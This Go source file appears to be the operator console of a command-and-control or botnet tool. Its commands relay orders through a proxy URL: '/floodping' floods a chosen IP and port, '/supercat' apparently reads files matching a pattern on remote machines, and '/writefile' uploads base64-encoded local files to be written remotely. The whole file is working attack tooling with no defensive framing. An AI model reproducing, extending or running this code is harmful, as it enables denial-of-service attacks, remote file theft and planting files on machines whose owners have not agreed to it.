package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// edit later
var options = []option{
	{"/help", 0, specificHelp},
	{"/clear", 0, CallClear},
	{"/exit", 0, exitFunction},
	{"/list", 0, nil},
	{"/floodping", -1, floodping},
	{"/supercat", -1, supercat},
	{"/writefile", -1, writefile},
}

func floodping(params ...interface{}) {
	paramsForFloodPing, ok1 := params[0].([]string)
	if !ok1 || len(paramsForFloodPing) < 2 {
		fmt.Println("floodping requires a IP and port")
		return
	}
	ipport := paramsForFloodPing[0] + ":" + paramsForFloodPing[1]

	data := comData{
		Cmd:  "floodping",
		Data: ipport,
	}

	jsondata, err := json.Marshal(data)

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Println("Response success:", response.Status)
	} else {
		fmt.Println("Response Failed:", response.Status)
	}

}

func supercat(params ...interface{}) {
	paramsForSupercat, ok1 := params[0].([]string)
	if !ok1 || len(paramsForSupercat) < 1 {
		fmt.Println("supercat requires at least 1 file pattern")
		return
	}
	fileglob := paramsForSupercat[0]

	data := comData{
		Cmd:  "supercat",
		Data: fileglob,
	}

	jsondata, err := json.Marshal(data)

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Println("Response success:", response.Status)
	} else {
		fmt.Println("Response Failed:", response.Status)
	}

}

func writefile(params ...interface{}) {
	paramsWritefile, ok := params[0].([]string)
	if !ok || len(paramsWritefile) < 1 {
		fmt.Println("writefile requires at least 1 file filename")
		return
	}

	type filePayload struct {
		Filename string `json:"filename"`
		Content  string `json:"content"`
	}

	filesData := []filePayload{}

	for _, filename := range paramsWritefile {
		contents, err := os.ReadFile(filename)
		if err != nil {
			fmt.Printf("Can't read %s, error: %v\n", filename, err)
			continue
		}
		filesData = append(filesData, filePayload{
			Filename: filepath.Base(filename),
			Content:  base64.StdEncoding.EncodeToString(contents),
		})
	}

	data := map[string]interface{}{
		"cmd":  "writefile",
		"file": filesData,
	}

	jsondata, err := json.Marshal(data)
	if err != nil {
		fmt.Println("There is an error:", err)
		return
	}

	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
	if err != nil {
		fmt.Println("There is an error:", err)
		return
	}

	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Println("Response success:", response.Status)
	} else {
		fmt.Println("Response Failed:", response.Status)
	}
}

// exits the program
func exitFunction(params ...interface{}) {
	exitStr := "Goodbye\n"
	for i := 0; i < len(exitStr); i++ {
		fmt.Print(string(exitStr[i]))
		time.Sleep(100 * time.Millisecond)
	}
	os.Exit(0)
	//return 1
}
